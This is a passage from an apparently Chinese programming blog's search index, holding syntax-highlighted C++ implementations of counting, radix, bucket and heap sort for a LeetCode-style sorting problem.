operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 基数排序（不适用于负数）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 桶排序 (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 堆排序（32 ms）</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
